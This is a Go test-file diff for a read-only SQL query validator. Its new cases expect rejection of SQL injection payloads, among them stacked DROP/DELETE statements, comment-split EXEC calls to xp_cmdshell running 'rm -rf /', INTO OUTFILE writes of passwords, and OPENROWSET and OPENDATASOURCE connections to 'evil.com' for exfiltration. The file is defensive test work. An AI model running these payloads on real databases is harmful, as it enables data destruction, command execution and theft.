@@ -31,6 +31,21 @@ func TestQueryValidator_ValidateQuery(t *testing.T) {
 			wantErr: false,
 		},
 		{
+			name:    "Valid T-SQL SELECT TOP",
+			query:   "SELECT TOP 10 * FROM users",
+			wantErr: false,
+		},
+		{
+			name:    "Valid T-SQL bracketed identifier",
+			query:   "SELECT [id], [user name] FROM [dbo].[users]",
+			wantErr: false,
+		},
+		{
+			name:    "Valid paren-wrapped UNION",
+			query:   "(SELECT id FROM users) UNION (SELECT id FROM customers)",
+			wantErr: false,
+		},
+		{
 			name:    "Block INSERT",
 			query:   "INSERT INTO users (name) VALUES ('hacker')",
 			wantErr: true,
@@ -80,6 +95,112 @@ func TestQueryValidator_ValidateQuery(t *testing.T) {
 			query:   "SELECT id, deleted FROM users WHERE deleted = 0",
 			wantErr: false,
 		},
+
+		// --- Fail-closed regression tests (regex-fallback bypass attempts) ---
+		// These payloads relied on the old regex fallback letting them through
+		// when the AST parser failed. With strict fail-closed validation they
+		// must all be rejected — either by the multi-statement guard or by the
+		// AST parser refusing to parse the input.
+		{
+			name:    "Bypass: stacked statement after SELECT prefix",
+			query:   "SELECT 1; DROP TABLE users",
+			wantErr: true,
+		},
+		{
+			name:    "Bypass: EXEC split by inline comment",
+			query:   "SELECT 1; EX/**/EC xp_cmdshell 'pwn'",
+			wantErr: true,
+		},
+		{
+			name:    "Bypass: stacked EXEC hidden behind a block comment prefix",
+			query:   "/* SELECT test */ ; EXEC xp_cmdshell 'rm -rf /'",
+			wantErr: true,
+		},
+		{
+			name:    "Bypass: DROP after line comment terminator",
+			query:   "SELECT 1 -- harmless\n; DROP TABLE users",
+			wantErr: true,
+		},
+		{
+			name:    "Bypass: stacked statement via single-quoted decoy",
+			query:   "SELECT 'safe;data'; DELETE FROM users",
+			wantErr: true,
+		},
+		{
+			name:    "Bypass: T-SQL EXEC alone (parser rejects)",
+			query:   "EXEC xp_cmdshell 'whoami'",
+			wantErr: true,
+		},
+		{
+			name:    "Bypass: unparseable garbage must not slip through",
+			query:   "totally not valid sql ;;;",
+			wantErr: true,
+		},
+		{
+			name:    "Trailing semicolon on a single SELECT is tolerated",
+			query:   "SELECT * FROM users;",
+			wantErr: false,
+		},
+		{
+			name:    "Semicolon inside string literal does not count as multi-statement",
+			query:   "SELECT 'a;b' AS x FROM users",
+			wantErr: false,
+		},
+
+		// --- SELECT-shape-disguised write/exfil attempts ---
+		// First-keyword classification accepts SELECT/WITH, but these
+		// statements still mutate state or exfiltrate. The forbidden-token
+		// scan is the safety net.
+		{
+			name:    "Reject SELECT INTO new_table (T-SQL / PG table creation)",
+			query:   "SELECT * INTO new_table FROM users",
+			wantErr: true,
+		},
+		{
+			name:    "Reject SELECT INTO #temp (T-SQL temp table)",
+			query:   "SELECT * INTO #temp_users FROM users WHERE active = 1",
+			wantErr: true,
+		},
+		{
+			name:    "Reject SELECT INTO OUTFILE (MySQL filesystem write)",
+			query:   "SELECT * FROM users INTO OUTFILE '/tmp/leak.csv'",
+			wantErr: true,
+		},
+		{
+			name:    "Reject SELECT INTO DUMPFILE (MySQL filesystem write)",
+			query:   "SELECT password FROM users INTO DUMPFILE '/tmp/leak'",
+			wantErr: true,
+		},
+		{
+			name:    "Reject OPENROWSET ad-hoc remote query (exfil vector)",
+			query:   "SELECT * FROM OPENROWSET('SQLOLEDB','evil.com';'sa';'pw','SELECT * FROM users')",
+			wantErr: true,
+		},
+		{
+			name:    "Reject OPENQUERY against linked server",
+			query:   "SELECT * FROM OPENQUERY(remote_srv, 'SELECT * FROM users')",
+			wantErr: true,
+		},
+		{
+			name:    "Reject OPENDATASOURCE ad-hoc connection",
+			query:   "SELECT * FROM OPENDATASOURCE('SQLOLEDB','Data Source=evil.com').db.dbo.users",
+			wantErr: true,
+		},
+		{
+			name:    "Reject CTE that exfils via SELECT INTO",
+			query:   "WITH cte AS (SELECT id, password FROM users) SELECT * INTO leak FROM cte",
+			wantErr: true,
+		},
+		{
+			name:    "Forbidden token hidden in /* */ does NOT cause false reject (it's stripped)",
+			query:   "SELECT id /* would write INTO somewhere */ FROM users",
+			wantErr: false,
+		},
+		{
+			name:    "Forbidden token hidden in string literal does NOT cause false reject",
+			query:   "SELECT id, 'INTO is fine inside a string' AS note FROM users",
+			wantErr: false,
+		},
 	}
 
 	for _, tt := range tests {
@@ -87,6 +208,99 @@ func TestQueryValidator_ValidateQuery(t *testing.T) {
 			err := validator.ValidateQuery(tt.query)
 			if (err != nil) != tt.wantErr {
 				t.Errorf("ValidateQuery() error = %v, wantErr %v", err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestFirstKeyword(t *testing.T) {
+	tests := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{"plain SELECT", "SELECT * FROM t", "SELECT"},
+		{"lowercase normalised", "select * from t", "SELECT"},
+		{"leading whitespace", "   \n\tSELECT 1", "SELECT"},
+		{"leading paren", "(SELECT 1)", "SELECT"},
+		{"double leading paren", "((SELECT 1))", "SELECT"},
+		{"block comment prefix", "/* hi */ SELECT 1", "SELECT"},
+		{"line comment prefix", "-- hi\nSELECT 1", "SELECT"},
+		{"WITH (CTE)", "WITH cte AS (SELECT 1) SELECT * FROM cte", "WITH"},
+		{"T-SQL TOP still classifies as SELECT", "SELECT TOP 10 * FROM t", "SELECT"},
+		{"DROP at start", "DROP TABLE x", "DROP"},
+		// "/* SELECT */ ; EXEC bad" → after stripping comments/strings the
+		// first non-whitespace, non-paren char is ';' which is not an
+		// identifier, so firstKeyword returns "". The multi-statement guard
+		// is what catches this payload separately.
+		{"stacked payload has no leading identifier", "/* SELECT */ ; EXEC bad", ""},
+		{"empty after stripping", "/* only comment */", ""},
+		{"only whitespace", "   \n\t  ", ""},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := firstKeyword(tt.in)
+			if got != tt.want {
+				t.Errorf("firstKeyword(%q) = %q, want %q", tt.in, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestStripCommentsAndStrings(t *testing.T) {
+	tests := []struct {
+		name string
+		in   string
+		// We don't assert exact output (whitespace details may vary); we assert
+		// that nothing that was hidden inside a comment/string remains.
+		mustNotContain []string
+		mustContain    []string
+	}{
+		{
+			name:           "Block comment removed",
+			in:             "SELECT /* DROP TABLE x */ 1",
+			mustNotContain: []string{"DROP", "TABLE"},
+			mustContain:    []string{"SELECT", "1"},
+		},
+		{
+			name:           "Line comment removed",
+			in:             "SELECT 1 -- DROP TABLE x\nFROM t",
+			mustNotContain: []string{"DROP", "TABLE x"},
+			mustContain:    []string{"SELECT", "FROM", "t"},
+		},
+		{
+			name:           "String literal removed",
+			in:             "SELECT 'DROP TABLE x' FROM t",
+			mustNotContain: []string{"DROP", "TABLE x"},
+			mustContain:    []string{"SELECT", "FROM", "t"},
+		},
+		{
+			name:           "Escaped quote inside string handled",
+			in:             "SELECT 'it''s; ok' FROM t",
+			mustNotContain: []string{"it", ";", "ok"},
+			mustContain:    []string{"SELECT", "FROM", "t"},
+		},
+		{
+			name:           "Adjacent tokens do not fuse across stripped comment",
+			in:             "EX/**/EC",
+			mustNotContain: []string{"EXEC"},
+			mustContain:    []string{"EX", "EC"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := stripCommentsAndStrings(tt.in)
+			for _, s := range tt.mustNotContain {
+				if strings.Contains(got, s) {
+					t.Errorf("stripCommentsAndStrings(%q) = %q; must not contain %q", tt.in, got, s)
+				}
+			}
+			for _, s := range tt.mustContain {
+				if !strings.Contains(got, s) {
+					t.Errorf("stripCommentsAndStrings(%q) = %q; expected to contain %q", tt.in, got, s)
+				}
 			}
 		})
 	}
